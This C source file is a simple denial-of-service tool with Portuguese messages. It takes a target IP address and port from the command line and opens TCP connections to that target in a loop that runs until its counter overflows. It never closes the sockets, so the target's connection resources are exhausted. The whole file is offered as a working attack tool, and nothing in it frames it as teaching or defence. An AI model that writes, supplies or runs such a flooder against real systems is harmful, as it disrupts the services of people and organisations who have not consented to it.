#include <stdio.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
	int sock, pipe, target_port, i;
	char *target_ip;

	if(argc<3){

	printf("O script DoS necessita de 3 argumentos para funcionar.\n");
	printf("Exemplo:./DoS <IP ALVO> <PORTA ALVO> \n");
	exit(0);

	}

	target_ip = argv[1];
	target_port = atoi(argv[2]);

	printf("[DEBUG] IP ALVO : %s \n",target_ip);
	printf("[DEBUG] PORTA ALVO : %d \n",target_port);

	struct sockaddr_in alvo;

	for(i=1;i>0;i++){

        sock = socket(AF_INET,SOCK_STREAM,0);
        alvo.sin_family = AF_INET;
        alvo.sin_port = htons(target_port);
        alvo.sin_addr.s_addr = inet_addr(target_ip);
	pipe = connect(sock, (struct sockaddr *)&alvo,sizeof(alvo));
	printf("DoS em execução no alvo %s:%d...\n",target_ip,target_port);

	}

}
